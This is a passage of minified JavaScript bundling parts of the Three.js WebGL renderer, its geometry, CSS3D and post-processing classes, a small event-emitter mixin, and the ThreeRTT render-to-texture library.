G);for(G=0;G<c.maxMorphNormals;G++)w.push("morphNormal"+G);for(r in b)w.push(r);r=w;G=0;for(b=r.length;G<b;G++)w=r[G],C.attributes[w]=l.getAttribLocation(C,w);C.id=ib++;ga.push({program:C,code:u,usedTimes:1});P.info.memory.programs=ga.length;r=C}a.program=r;G=a.program.attributes;if(a.morphTargets)for(a.numSupportedMorphTargets=0,b="morphTarget",r=0;r<this.maxMorphTargets;r++)C=b+r,0<=G[C]&&a.numSupportedMorphTargets++;if(a.morphNormals)for(a.numSupportedMorphNormals=0,b="morphNormal",r=0;r<this.maxMorphNormals;r++)C=
b+r,0<=G[C]&&a.numSupportedMorphNormals++;a.uniformsList=[];for(k in a.uniforms)a.uniformsList.push([a.uniforms[k],k])};this.setFaceCulling=function(a,b){a===THREE.CullFaceNone?l.disable(l.CULL_FACE):(b===THREE.FrontFaceDirectionCW?l.frontFace(l.CW):l.frontFace(l.CCW),a===THREE.CullFaceBack?l.cullFace(l.BACK):a===THREE.CullFaceFront?l.cullFace(l.FRONT):l.cullFace(l.FRONT_AND_BACK),l.enable(l.CULL_FACE))};this.setMaterialFaces=function(a){var b=a.side===THREE.DoubleSide;a=a.side===THREE.BackSide;fa!==
b&&(b?l.disable(l.CULL_FACE):l.enable(l.CULL_FACE),fa=b);la!==a&&(a?l.frontFace(l.CW):l.frontFace(l.CCW),la=a)};this.setDepthTest=function(a){db!==a&&(a?l.enable(l.DEPTH_TEST):l.disable(l.DEPTH_TEST),db=a)};this.setDepthWrite=function(a){xa!==a&&(l.depthMask(a),xa=a)};this.setBlending=function(a,b,c,e){a!==Ba&&(a===THREE.NoBlending?l.disable(l.BLEND):a===THREE.AdditiveBlending?(l.enable(l.BLEND),l.blendEquation(l.FUNC_ADD),l.blendFunc(l.SRC_ALPHA,l.ONE)):a===THREE.SubtractiveBlending?(l.enable(l.BLEND),
l.blendEquation(l.FUNC_ADD),l.blendFunc(l.ZERO,l.ONE_MINUS_SRC_COLOR)):a===THREE.MultiplyBlending?(l.enable(l.BLEND),l.blendEquation(l.FUNC_ADD),l.blendFunc(l.ZERO,l.SRC_COLOR)):a===THREE.CustomBlending?l.enable(l.BLEND):(l.enable(l.BLEND),l.blendEquationSeparate(l.FUNC_ADD,l.FUNC_ADD),l.blendFuncSeparate(l.SRC_ALPHA,l.ONE_MINUS_SRC_ALPHA,l.ONE,l.ONE_MINUS_SRC_ALPHA)),Ba=a);if(a===THREE.CustomBlending){if(b!==qa&&(l.blendEquation(X(b)),qa=b),c!==ma||e!==Ma)l.blendFunc(X(c),X(e)),ma=c,Ma=e}else Ma=
ma=qa=null};this.setTexture=function(a,b){if(a.needsUpdate){a.__webglInit||(a.__webglInit=!0,a.addEventListener("dispose",kc),a.__webglTexture=l.createTexture(),P.info.memory.textures++);l.activeTexture(l.TEXTURE0+b);l.bindTexture(l.TEXTURE_2D,a.__webglTexture);l.pixelStorei(l.UNPACK_FLIP_Y_WEBGL,a.flipY);l.pixelStorei(l.UNPACK_PREMULTIPLY_ALPHA_WEBGL,a.premultiplyAlpha);l.pixelStorei(l.UNPACK_ALIGNMENT,a.unpackAlignment);var c=a.image,e=T(c.width)&&T(c.height),g=X(a.format),f=X(a.type);H(l.TEXTURE_2D,
a,e);var h=a.mipmaps;if(a instanceof THREE.DataTexture)if(0<h.length&&e){for(var q=0,k=h.length;q<k;q++)c=h[q],l.texImage2D(l.TEXTURE_2D,q,g,c.width,c.height,0,g,f,c.data);a.generateMipmaps=!1}else l.texImage2D(l.TEXTURE_2D,0,g,c.width,c.height,0,g,f,c.data);else if(a instanceof THREE.CompressedTexture)for(q=0,k=h.length;q<k;q++)c=h[q],l.compressedTexImage2D(l.TEXTURE_2D,q,g,c.width,c.height,0,c.data);else if(0<h.length&&e){q=0;for(k=h.length;q<k;q++)c=h[q],l.texImage2D(l.TEXTURE_2D,q,g,g,f,c);a.generateMipmaps=
!1}else l.texImage2D(l.TEXTURE_2D,0,g,g,f,a.image);a.generateMipmaps&&e&&l.generateMipmap(l.TEXTURE_2D);a.needsUpdate=!1;if(a.onUpdate)a.onUpdate()}else l.activeTexture(l.TEXTURE0+b),l.bindTexture(l.TEXTURE_2D,a.__webglTexture)};this.setRenderTarget=function(a){var b=a instanceof THREE.WebGLRenderTargetCube;if(a&&!a.__webglFramebuffer){void 0===a.depthBuffer&&(a.depthBuffer=!0);void 0===a.stencilBuffer&&(a.stencilBuffer=!0);a.addEventListener("dispose",yc);a.__webglTexture=l.createTexture();P.info.memory.textures++;
var c=T(a.width)&&T(a.height),e=X(a.format),g=X(a.type);if(b){a.__webglFramebuffer=[];a.__webglRenderbuffer=[];l.bindTexture(l.TEXTURE_CUBE_MAP,a.__webglTexture);H(l.TEXTURE_CUBE_MAP,a,c);for(var f=0;6>f;f++){a.__webglFramebuffer[f]=l.createFramebuffer();a.__webglRenderbuffer[f]=l.createRenderbuffer();l.texImage2D(l.TEXTURE_CUBE_MAP_POSITIVE_X+f,0,e,a.width,a.height,0,e,g,null);var h=a,q=l.TEXTURE_CUBE_MAP_POSITIVE_X+f;l.bindFramebuffer(l.FRAMEBUFFER,a.__webglFramebuffer[f]);l.framebufferTexture2D(l.FRAMEBUFFER,
l.COLOR_ATTACHMENT0,q,h.__webglTexture,0);Z(a.__webglRenderbuffer[f],a)}c&&l.generateMipmap(l.TEXTURE_CUBE_MAP)}else a.__webglFramebuffer=l.createFramebuffer(),a.__webglRenderbuffer=a.shareDepthFrom?a.shareDepthFrom.__webglRenderbuffer:l.createRenderbuffer(),l.bindTexture(l.TEXTURE_2D,a.__webglTexture),H(l.TEXTURE_2D,a,c),l.texImage2D(l.TEXTURE_2D,0,e,a.width,a.height,0,e,g,null),e=l.TEXTURE_2D,l.bindFramebuffer(l.FRAMEBUFFER,a.__webglFramebuffer),l.framebufferTexture2D(l.FRAMEBUFFER,l.COLOR_ATTACHMENT0,
e,a.__webglTexture,0),a.shareDepthFrom?a.depthBuffer&&!a.stencilBuffer?l.framebufferRenderbuffer(l.FRAMEBUFFER,l.DEPTH_ATTACHMENT,l.RENDERBUFFER,a.__webglRenderbuffer):a.depthBuffer&&a.stencilBuffer&&l.framebufferRenderbuffer(l.FRAMEBUFFER,l.DEPTH_STENCIL_ATTACHMENT,l.RENDERBUFFER,a.__webglRenderbuffer):Z(a.__webglRenderbuffer,a),c&&l.generateMipmap(l.TEXTURE_2D);b?l.bindTexture(l.TEXTURE_CUBE_MAP,null):l.bindTexture(l.TEXTURE_2D,null);l.bindRenderbuffer(l.RENDERBUFFER,null);l.bindFramebuffer(l.FRAMEBUFFER,
null)}a?(b=b?a.__webglFramebuffer[a.activeCubeFace]:a.__webglFramebuffer,c=a.width,a=a.height,g=e=0):(b=null,c=Sb,a=Tb,e=hc,g=ic);b!==Db&&(l.bindFramebuffer(l.FRAMEBUFFER,b),l.viewport(e,g,c,a),Db=b);ec=c;sc=a};this.shadowMapPlugin=new THREE.ShadowMapPlugin;this.addPrePlugin(this.shadowMapPlugin);this.addPostPlugin(new THREE.SpritePlugin);this.addPostPlugin(new THREE.LensFlarePlugin)};
THREE.WebGLRenderTarget=function(a,b,c){this.width=a;this.height=b;c=c||{};this.wrapS=void 0!==c.wrapS?c.wrapS:THREE.ClampToEdgeWrapping;this.wrapT=void 0!==c.wrapT?c.wrapT:THREE.ClampToEdgeWrapping;this.magFilter=void 0!==c.magFilter?c.magFilter:THREE.LinearFilter;this.minFilter=void 0!==c.minFilter?c.minFilter:THREE.LinearMipMapLinearFilter;this.anisotropy=void 0!==c.anisotropy?c.anisotropy:1;this.offset=new THREE.Vector2(0,0);this.repeat=new THREE.Vector2(1,1);this.format=void 0!==c.format?c.format:
THREE.RGBAFormat;this.type=void 0!==c.type?c.type:THREE.UnsignedByteType;this.depthBuffer=void 0!==c.depthBuffer?c.depthBuffer:!0;this.stencilBuffer=void 0!==c.stencilBuffer?c.stencilBuffer:!0;this.generateMipmaps=!0;this.shareDepthFrom=null};
THREE.WebGLRenderTarget.prototype={constructor:THREE.WebGLRenderTarget,addEventListener:THREE.EventDispatcher.prototype.addEventListener,hasEventListener:THREE.EventDispatcher.prototype.hasEventListener,removeEventListener:THREE.EventDispatcher.prototype.removeEventListener,dispatchEvent:THREE.EventDispatcher.prototype.dispatchEvent,clone:function(){var a=new THREE.WebGLRenderTarget(this.width,this.height);a.wrapS=this.wrapS;a.wrapT=this.wrapT;a.magFilter=this.magFilter;a.minFilter=this.minFilter;
a.anisotropy=this.anisotropy;a.offset.copy(this.offset);a.repeat.copy(this.repeat);a.format=this.format;a.type=this.type;a.depthBuffer=this.depthBuffer;a.stencilBuffer=this.stencilBuffer;a.generateMipmaps=this.generateMipmaps;a.shareDepthFrom=this.shareDepthFrom;return a},dispose:function(){this.dispatchEvent({type:"dispose"})}};THREE.WebGLRenderTargetCube=function(a,b,c){THREE.WebGLRenderTarget.call(this,a,b,c);this.activeCubeFace=0};THREE.WebGLRenderTargetCube.prototype=Object.create(THREE.WebGLRenderTarget.prototype);
THREE.CubeGeometry=function(a,b,c,e,g,f){function h(a,b,c,e,g,f,h,z){var C,B=k.widthSegments,D=k.heightSegments,G=g/2,W=f/2,u=k.vertices.length;if("x"===a&&"y"===b||"y"===a&&"x"===b)C="z";else if("x"===a&&"z"===b||"z"===a&&"x"===b)C="y",D=k.depthSegments;else if("z"===a&&"y"===b||"y"===a&&"z"===b)C="x",B=k.depthSegments;var O=B+1,K=D+1,F=g/B,L=f/D,I=new THREE.Vector3;I[C]=0<h?1:-1;for(g=0;g<K;g++)for(f=0;f<O;f++){var J=new THREE.Vector3;J[a]=(f*F-G)*c;J[b]=(g*L-W)*e;J[C]=h;k.vertices.push(J)}for(g=
0;g<D;g++)for(f=0;f<B;f++)a=new THREE.Face4(f+O*g+u,f+O*(g+1)+u,f+1+O*(g+1)+u,f+1+O*g+u),a.normal.copy(I),a.vertexNormals.push(I.clone(),I.clone(),I.clone(),I.clone()),a.materialIndex=z,k.faces.push(a),k.faceVertexUvs[0].push([new THREE.Vector2(f/B,1-g/D),new THREE.Vector2(f/B,1-(g+1)/D),new THREE.Vector2((f+1)/B,1-(g+1)/D),new THREE.Vector2((f+1)/B,1-g/D)])}THREE.Geometry.call(this);var k=this;this.width=a;this.height=b;this.depth=c;this.widthSegments=e||1;this.heightSegments=g||1;this.depthSegments=
f||1;a=this.width/2;b=this.height/2;c=this.depth/2;h("z","y",-1,-1,this.depth,this.height,a,0);h("z","y",1,-1,this.depth,this.height,-a,1);h("x","z",1,1,this.width,this.depth,b,2);h("x","z",1,-1,this.width,this.depth,-b,3);h("x","y",1,-1,this.width,this.height,c,4);h("x","y",-1,-1,this.width,this.height,-c,5);this.computeCentroids();this.mergeVertices()};THREE.CubeGeometry.prototype=Object.create(THREE.Geometry.prototype);
THREE.PlaneGeometry=function(a,b,c,e){THREE.Geometry.call(this);this.width=a;this.height=b;this.widthSegments=c||1;this.heightSegments=e||1;c=a/2;var g=b/2;e=this.widthSegments;var f=this.heightSegments,h=e+1,k=f+1,p=this.width/e,m=this.height/f,t=new THREE.Vector3(0,0,1);for(a=0;a<k;a++)for(b=0;b<h;b++)this.vertices.push(new THREE.Vector3(b*p-c,-(a*m-g),0));for(a=0;a<f;a++)for(b=0;b<e;b++)c=new THREE.Face4(b+h*a,b+h*(a+1),b+1+h*(a+1),b+1+h*a),c.normal.copy(t),c.vertexNormals.push(t.clone(),t.clone(),
t.clone(),t.clone()),this.faces.push(c),this.faceVertexUvs[0].push([new THREE.Vector2(b/e,1-a/f),new THREE.Vector2(b/e,1-(a+1)/f),new THREE.Vector2((b+1)/e,1-(a+1)/f),new THREE.Vector2((b+1)/e,1-a/f)]);this.computeCentroids()};THREE.PlaneGeometry.prototype=Object.create(THREE.Geometry.prototype);THREE.ImmediateRenderObject=function(){THREE.Object3D.call(this);this.render=function(a){}};THREE.ImmediateRenderObject.prototype=Object.create(THREE.Object3D.prototype);
THREE.LensFlare=function(a,b,c,e,g){THREE.Object3D.call(this);this.lensFlares=[];this.positionScreen=new THREE.Vector3;this.customUpdateCallback=void 0;void 0!==a&&this.add(a,b,c,e,g)};THREE.LensFlare.prototype=Object.create(THREE.Object3D.prototype);
THREE.LensFlare.prototype.add=function(a,b,c,e,g,f){void 0===b&&(b=-1);void 0===c&&(c=0);void 0===f&&(f=1);void 0===g&&(g=new THREE.Color(16777215));void 0===e&&(e=THREE.NormalBlending);c=Math.min(c,Math.max(0,c));this.lensFlares.push({texture:a,size:b,distance:c,x:0,y:0,z:0,scale:1,rotation:1,opacity:f,color:g,blending:e})};
THREE.LensFlare.prototype.updateLensFlares=function(){var a,b=this.lensFlares.length,c,e=2*-this.positionScreen.x,g=2*-this.positionScreen.y;for(a=0;a<b;a++)c=this.lensFlares[a],c.x=this.positionScreen.x+e*c.distance,c.y=this.positionScreen.y+g*c.distance,c.wantedRotation=c.x*Math.PI*.25,c.rotation+=.25*(c.wantedRotation-c.rotation)};THREE.LensFlarePlugin=function(){this.init=function(a){};this.render=function(a,b,c,e){}};
THREE.ShadowMapPlugin=function(){this.init=function(a){};this.render=function(a,b){};this.update=function(a,b){}};THREE.SpritePlugin=function(){this.init=function(a){};this.render=function(a,b,c,e){}};THREE.DepthPassPlugin=function(){this.init=function(a){};this.render=function(a,b){};this.update=function(a,b){}};
THREE.CSS3DObject=function(a){THREE.Object3D.call(this);this.element=a;this.element.style.position="absolute";this.element.style.WebkitTransformStyle="preserve-3d";this.element.style.MozTransformStyle="preserve-3d";this.element.style.oTransformStyle="preserve-3d";this.element.style.transformStyle="preserve-3d"};THREE.CSS3DObject.prototype=Object.create(THREE.Object3D.prototype);THREE.CSS3DSprite=function(a){THREE.CSS3DObject.call(this,a)};THREE.CSS3DSprite.prototype=Object.create(THREE.CSS3DObject.prototype);
THREE.CSS3DRenderer=function(a){a=a||{};var b,c,e,g,f=new THREE.Matrix4,h=a.cameraElement||document.createElement("div"),k=h.parentNode||document.createElement("div");k.style.overflow="hidden";k.style.WebkitTransformStyle="preserve-3d";k.style.WebkitPerspectiveOrigin="50% 50%";k.style.MozTransformStyle="preserve-3d";k.style.MozPerspectiveOrigin="50% 50%";k.style.oTransformStyle="preserve-3d";k.style.oPerspectiveOrigin="50% 50%";k.style.transformStyle="preserve-3d";k.style.perspectiveOrigin="50% 50%";
k.classList.add("css3d-frame");this.domElement=k;h.style.WebkitTransformStyle="preserve-3d";h.style.MozTransformStyle="preserve-3d";h.style.oTransformStyle="preserve-3d";h.style.transformStyle="preserve-3d";h.classList.add("css3d-camera");h.parentNode||k.appendChild(h);this.cameraElement=h;this.setSize=function(a,f){b=a;c=f;e=b/2;g=c/2;k.style.width=a+"px";k.style.height=f+"px";h.style.width=a+"px";h.style.height=f+"px"};var p=function(a){return 1E-6>Math.abs(a)?0:a},m=function(a){a=a.elements;return"translate3d(-50%,-50%,0) matrix3d("+
p(a[0])+","+p(a[1])+","+p(a[2])+","+p(a[3])+","+p(-a[4])+","+p(-a[5])+","+p(-a[6])+","+p(-a[7])+","+p(a[8])+","+p(a[9])+","+p(a[10])+","+p(a[11])+","+p(a[12])+","+p(a[13])+","+p(a[14])+","+p(a[15])+")"},t=function(a,b){if(a instanceof THREE.CSS3DObject){var c;a instanceof THREE.CSS3DSprite?(f.copy(b.matrixWorldInverse),f.transpose(),f.copyPosition(a.matrixWorld),f.scale(a.scale),f.elements[3]=0,f.elements[7]=0,f.elements[11]=0,f.elements[15]=1,c=m(f)):c=m(a.matrixWorld);var e=a.element;e.style.WebkitTransform=
c;e.style.MozTransform=c;e.style.oTransform=c;e.style.transform=c;e.parentNode!==h&&h.appendChild(e)}c=0;for(e=a.children.length;c<e;c++)t(a.children[c],b)};this.render=function(a,b){var f=.5/Math.tan(THREE.Math.degToRad(.5*b.fov))*c;k.style.WebkitPerspective=f+"px";k.style.MozPerspective=f+"px";k.style.oPerspective=f+"px";k.style.perspective=f+"px";a.updateMatrixWorld();var r;r=b.matrixWorldInverse.elements;r="matrix3d("+p(r[0])+","+p(-r[1])+","+p(r[2])+","+p(r[3])+","+p(r[4])+","+p(-r[5])+","+p(r[6])+
","+p(r[7])+","+p(r[8])+","+p(-r[9])+","+p(r[10])+","+p(r[11])+","+p(r[12])+","+p(-r[13])+","+p(r[14])+","+p(r[15])+")";f="translate3d(0,0,"+f+"px)"+r+" translate3d("+e+"px,"+g+"px, 0)";h.style.WebkitTransform=f;h.style.MozTransform=f;h.style.oTransform=f;h.style.transform=f;t(a,b)}};THREE.CallbackPass=function(a){this.clear=this.enabled=!0;this.needsSwap=!1;this.callback=a};THREE.CallbackPass.prototype={render:function(a,b,c,e){this.callback(b,c)}};
THREE.CopyShader={uniforms:{tDiffuse:{type:"t",value:null},opacity:{type:"f",value:1}},vertexShader:"varying vec2 vUv;\nvoid main() {\nvUv = uv;\ngl_Position = projectionMatrix * modelViewMatrix * vec4( position, 1.0 );\n}",fragmentShader:"uniform float opacity;\nuniform sampler2D tDiffuse;\nvarying vec2 vUv;\nvoid main() {\nvec4 texel = texture2D( tDiffuse, vUv );\ngl_FragColor = opacity * texel;\n}"};
THREE.EffectComposer=function(a,b){this.renderer=a;this.retina=a.devicePixelRatio;void 0===b&&(b=new THREE.WebGLRenderTarget(window.innerWidth*this.retina||1,window.innerHeight*this.retina||1,{minFilter:THREE.NearestFilter,magFilter:THREE.NearestFilter,format:THREE.RGBFormat,stencilBuffer:!1}));this.renderTarget1=b;this.renderTarget2=b.clone();this.writeBuffer=this.renderTarget1;this.readBuffer=this.renderTarget2;this.passes=[];void 0===THREE.CopyShader&&console.error("THREE.EffectComposer relies on THREE.CopyShader");
this.copyPass=new THREE.ShaderPass(THREE.CopyShader)};
THREE.EffectComposer.prototype={swapBuffers:function(){var a=this.readBuffer;this.readBuffer=this.writeBuffer;this.writeBuffer=a},addPass:function(a){this.passes.push(a)},insertPass:function(a,b){this.passes.splice(b,0,a)},render:function(a){this.writeBuffer=this.renderTarget1;this.readBuffer=this.renderTarget2;var b=!1,c,e,g=this.passes.length;for(e=0;e<g;e++)if(c=this.passes[e],c.enabled){c.render(this.renderer,this.writeBuffer,this.readBuffer,a,b);if(c.needsSwap){if(b){var f=this.renderer.context;
f.stencilFunc(f.NOTEQUAL,1,4294967295);this.copyPass.render(this.renderer,this.writeBuffer,this.readBuffer,a);f.stencilFunc(f.EQUAL,1,4294967295)}this.swapBuffers()}c instanceof THREE.MaskPass?b=!0:c instanceof THREE.ClearMaskPass&&(b=!1)}},reset:function(a){void 0===a&&(a=this.renderTarget1.clone(),a.width=window.innerWidth*this.retina,a.height=window.innerHeight*this.retina);this.renderTarget1=a;this.renderTarget2=a.clone();this.writeBuffer=this.renderTarget1;this.readBuffer=this.renderTarget2},
setSize:function(a,b){this.renderTarget1.dispose();this.renderTarget2.dispose();var c=this.renderTarget1.clone();c.width=a*this.retina;c.height=b*this.retina;this.reset(c)}};THREE.EffectComposer.camera=new THREE.OrthographicCamera(-1,1,1,-1,0,1);THREE.EffectComposer.quad=new THREE.Mesh(new THREE.PlaneGeometry(2,2),null);THREE.EffectComposer.scene=new THREE.Scene;THREE.EffectComposer.scene.add(THREE.EffectComposer.quad);
THREE.MaskPass=function(a,b){this.scene=a;this.camera=b;this.clear=this.enabled=!0;this.inverse=this.needsSwap=!1};
THREE.MaskPass.prototype={render:function(a,b,c,e){e=a.context;e.colorMask(!1,!1,!1,!1);e.depthMask(!1);var g,f;this.inverse?(g=0,f=1):(g=1,f=0);e.enable(e.STENCIL_TEST);e.stencilOp(e.REPLACE,e.REPLACE,e.REPLACE);e.stencilFunc(e.ALWAYS,g,4294967295);e.clearStencil(f);a.render(this.scene,this.camera,c,this.clear);a.render(this.scene,this.camera,b,this.clear);e.colorMask(!0,!0,!0,!0);e.depthMask(!0);e.stencilFunc(e.EQUAL,1,4294967295);e.stencilOp(e.KEEP,e.KEEP,e.KEEP)}};
THREE.ClearMaskPass=function(){this.enabled=!0};THREE.ClearMaskPass.prototype={render:function(a,b,c,e){a=a.context;a.disable(a.STENCIL_TEST)}};THREE.RenderPass=function(a,b,c,e,g){this.scene=a;this.camera=b;this.overrideMaterial=c;this.clearColor=e;this.clearAlpha=void 0!==g?g:1;this.oldClearColor=new THREE.Color;this.oldClearAlpha=1;this.clear=this.enabled=!0;this.needsSwap=!1};
THREE.RenderPass.prototype={render:function(a,b,c,e){this.scene.overrideMaterial=this.overrideMaterial;this.clearColor&&(this.oldClearColor.copy(a.getClearColor()),this.oldClearAlpha=a.getClearAlpha(),a.setClearColor(this.clearColor,this.clearAlpha));a.render(this.scene,this.camera,c,this.clear);this.clearColor&&a.setClearColor(this.oldClearColor,this.oldClearAlpha);this.scene.overrideMaterial=null}};
THREE.ShaderPass=function(a,b){this.textureID=void 0!==b?b:"tDiffuse";this.uniforms=THREE.UniformsUtils.clone(a.uniforms);this.material=new THREE.ShaderMaterial({uniforms:this.uniforms,vertexShader:a.vertexShader,fragmentShader:a.fragmentShader});this.renderToScreen=!1;this.needsSwap=this.enabled=!0;this.clear=!1};
THREE.ShaderPass.prototype={render:function(a,b,c,e){this.uniforms[this.textureID]&&(this.uniforms[this.textureID].value=c);THREE.EffectComposer.quad.material=this.material;this.renderToScreen?a.render(THREE.EffectComposer.scene,THREE.EffectComposer.camera):a.render(THREE.EffectComposer.scene,THREE.EffectComposer.camera,b,this.clear)}};
THREE.TexturePass=function(a,b){void 0===THREE.CopyShader&&console.error("THREE.TexturePass relies on THREE.CopyShader");var c=THREE.CopyShader;this.uniforms=THREE.UniformsUtils.clone(c.uniforms);this.uniforms.opacity.value=void 0!==b?b:1;this.uniforms.tDiffuse.value=a;this.material=new THREE.ShaderMaterial({uniforms:this.uniforms,vertexShader:c.vertexShader,fragmentShader:c.fragmentShader});this.enabled=!0;this.needsSwap=!1};
THREE.TexturePass.prototype={render:function(a,b,c,e){THREE.EffectComposer.quad.material=this.material;a.render(THREE.EffectComposer.scene,THREE.EffectComposer.camera,c)}};var MicroEvent=function(){};
MicroEvent.prototype={bind:function(a,b){this._events=this._events||{};this._events[a]=this._events[a]||[];this._events[a].push(b)},unbind:function(a,b){this._events=this._events||{};!1!==a in this._events&&this._events[a].splice(this._events[a].indexOf(b),1)},trigger:function(a){this._events=this._events||{};if(!1!==a in this._events)for(var b=0;b<this._events[a].length;b++)this._events[a][b].apply(this,Array.prototype.slice.call(arguments,1))}};
MicroEvent.mixin=function(a){for(var b=["bind","unbind","trigger"],c=0;c<b.length;c++)a.prototype[b[c]]=MicroEvent.prototype[b[c]]};"undefined"!==typeof module&&"exports"in module&&(module.exports=MicroEvent);(function(a){for(var b in a)if(!window[b])throw"Error: ThreeRTT requires "+a[b];})({THREE:"Three.js"});window.ThreeRTT=window.ThreeRTT||{};ThreeRTT.World=function(){};ThreeRTT.getShader=function(a){var b=document.getElementById(a);return b&&b.innerText||a};
_.loop=function(a,b){for(var c=0;c<a;++c)b(c)};ThreeRTT.getShader=function(a){var b=document.getElementById(a);return b&&(b.innerText||b.textContent)||a};ThreeRTT.isPowerOfTwo=function(a){return 0===(a&a-1)};ThreeRTT.toTarget=function(a){return ThreeRTT.Stage&&a instanceof ThreeRTT.Stage?a.target:ThreeRTT.World&&a instanceof ThreeRTT.World?a.target():a};ThreeRTT.toTexture=function(a,b){a=ThreeRTT.toTarget(a);return ThreeRTT.RenderTarget&&a instanceof ThreeRTT.RenderTarget?a.read():a};
MicroEvent.prototype.on=function(){MicroEvent.prototype.bind.apply(this,arguments);return this};MicroEvent.prototype.emit=function(){MicroEvent.prototype.trigger.apply(this,arguments);return this};MicroEvent.mixin=function(a){for(var b=["bind","unbind","trigger","on","emit"],c=0;c<b.length;c++)a.prototype[b[c]]=MicroEvent.prototype[b[c]]};
ThreeRTT.Stage=function(a,b){b=_.extend({history:0,camera:{},scene:null},b);b.camera.aspect=b.camera.aspect||b.width/b.height;this.scene=b.scene||new THREE.Scene;this.camera=ThreeRTT.Camera(b.camera);this.scene.add(this.camera);this.target=new ThreeRTT.RenderTarget(a,b);this.reset();this.size(b.width,b.height)};
ThreeRTT.Stage.prototype={options:function(){return this.target.options},reset:function(){this.renderables&&_.each(this.renderables,function(a){this.scene.remove(a)}.bind(this));this.passes=[];this.renderables=[]},paint:function(a,b){var c=new THREE.Object3D;c.frustumCulled=!1;c.visible=!0;if(!b){var e=new ThreeRTT.FragmentMaterial(this,"generic-fragment-texture"),e=this._surface(e);c.add(e)}c.add(a);this.scene.add(c);this.passes.push(1);this.renderables.push(c)},iterate:function(a,b){var c=this._surface(b);
c.visible=!1;this.scene.add(c);this.passes.push(a);this.renderables.push(c);return this},fragment:function(a){this.iterate(1,a);return this},size:function(a,b){a=Math.floor(a);b=Math.floor(b);this.camera.aspect=a/b;this.target.size(a,b);return this},read:function(a){return this.target.read(a)},uniform:function(){return this.target.uniform()},render:function(){function a(b,c){b.visible=c;_.each(b.children,function(b){a(b,c)})}this.target.clear();_.each(this.passes,function(b,c){a(this.renderables[c],
!0);_.loop(b,function(a){this.target.render(this.scene,this.camera)}.bind(this));a(this.renderables[c],!1)}.bind(this));return this},clear:function(){this.target.clear();return this},destroy:function(){this.target.deallocate();this.target=this.camera=this.scene=null},_surface:function(a){var b=new THREE.Mesh(new ThreeRTT.ScreenGeometry,{});b.frustumCulled=!1;b.material=a;b.renderDepth=Infinity;return b}};
ThreeRTT.Camera=function(a){if(a.constructor instanceof THREE.Camera)return a;a=_.extend({aspect:1,far:1E4,fov:85,near:.01,ortho:!1,scale:1},a);if(a.ortho){var b=a.scale,c=a.aspect;return new THREE.OrthographicCamera(-b*c,b*c,-b,b,a.near,a.far)}return new THREE.PerspectiveCamera(a.fov,a.aspect,a.near,a.far)};
ThreeRTT.RenderTarget=function(a,b){this.options=b=_.extend({width:256,height:256,texture:{},clear:{color:!1,depth:!1,stencil:!1},clearColor:16777215,clearAlpha:1,history:0,scene:null,camera:null,autoAdvance:!0},b);this.renderer=a;ThreeRTT.isPowerOfTwo(b.width)&&ThreeRTT.isPowerOfTwo(b.height)||b.texture.minFilter||(b.texture.minFilter=THREE.LinearFilter);this.history(this.options.history,!0);this.size(b.width,b.height);this.clear()};
ThreeRTT.RenderTarget.prototype={read:function(a){a=Math.max(0,Math.min(this.options.history,Math.abs(a||0)));return this.virtuals[a]},write:function(){return this.targets[this.index]},history:function(a,b){void 0!==a&&(this._history=a,this.buffers=a+2,b||this.allocate());return this._history},size:function(a,b){a&&b&&(this.width=Math.floor(a),this.height=Math.floor(b),this.allocate());return{width:this.width,height:this.height}},deallocate:function(){this.deallocateTargets()},allocate:function(){this.deallocateTargets();
this.allocateTargets();this.allocateVirtuals()},deallocateTargets:function(){_.each(this.targets||[],function(a){a.dispose()}.bind(this))},allocateTargets:function(){var a=this.options;n=this.buffers;var b=this.targets=[];_.loop(n,function(c){b.push(new THREE.WebGLRenderTarget(this.width,this.height,a.texture));b[c].__index=c}.bind(this))},allocateVirtuals:function(){var a=this.targets[0],b=this.virtuals||[];n=Math.max(1,this.buffers-1);n>b.length?_.loop(n-b.length,function(){b.push(a.clone())}.bind(this)):
b=b.slice(0,n);_.each(b,function(a,b){a.width=this.width;a.height=this.height;a.__index=b}.bind(this));this.virtuals=b;this.index=-1;this.advance()},advance:function(){var a=this.targets,b=this.virtuals,c=this.index,e=this.buffers,g=b.length;this.index=c=(c+1)%e;_.loop(g,function(f){var h=b[f];f=a[(g-f+c)%e];h.__webglTexture=f.__webglTexture;h.__webglFramebuffer=f.__webglFramebuffer;h.__webglRenderbuffer=f.__webglRenderbuffer;h.__index=f.__index})},clear:function(){var a=this.options,b=a.clear,c=
this.renderer;if(b.color||b.stencil||b.depth){var e=c.getClearColor().clone(),g=c.getClearAlpha();c.setClearColor(a.clearColor,a.clearAlpha);c.clearTarget(this.write(),b.color,b.stencil,b.depth);c.setClearColor(e,g)}},render:function(a,b){this.emit("render",a,b);var c=this.renderer.autoClear;this.renderer.autoClear=!1;this.clear();this.renderer.render(a,b,this.write());this.renderer.autoClear=c;this.options.autoAdvance&&this.advance()},uniform:function(a){var b=this.history();if(b){var c=[];_.loop(b+
1,function(a){c.push(this.read(-a))}.bind(this));return{type:"tv",value:c,count:b+1}}return{type:"t",value:a,texture:this.read(),count:1}}};MicroEvent.mixin(ThreeRTT.RenderTarget);ThreeRTT.ScreenGeometry=function(){return new THREE.PlaneGeometry(2,2,1,1)};
ThreeRTT.ShaderMaterial=function(a,b,c,e,g){if(e instanceof Array){var f={};_.each(e,function(a,b){f["texture"+(i+1)]=a});e=f}else if(e instanceof THREE.Texture||e instanceof ThreeRTT.World||e instanceof THREE.WebGLRenderTarget)e={texture1:e};a instanceof Array||(a=[a]);a=_.map(a,function(a){return ThreeRTT.toTarget(a)});g=_.extend(g||{},{sampleStep:{type:"v2",value:new THREE.Vector2}});_.each(e,function(a,b){g[b]={type:"t",value:ThreeRTT.toTexture(a)}});_.each(a,function(a,b){var c="texture"+(b+
1);a.read&&!g[c]&&(g[c]={type:"t",value:a.read()})});g.texture1&&!g.texture&&(g.texture=g.texture1);a[0].on("render",function(){var b=a[0].options.texture,c=b.wrapT,e={1E3:0,1001:1,1002:0},f=g.sampleStep.value;f.x=1/(a[0].width-(e[b.wrapS]||0));f.y=1/(a[0].height-(e[c]||0))});return new THREE.ShaderMaterial({uniforms:g,vertexShader:ThreeRTT.getShader(b||"generic-vertex"),fragmentShader:ThreeRTT.getShader(c||"generic-fragment-texture")})};
ThreeRTT.Display=function(a,b,c){a instanceof Array||(a=[a]);this.gx=b||a.length;this.gy=c||1;this.targets=a;this.n=a.length;THREE.Object3D.call(this);this.make()};
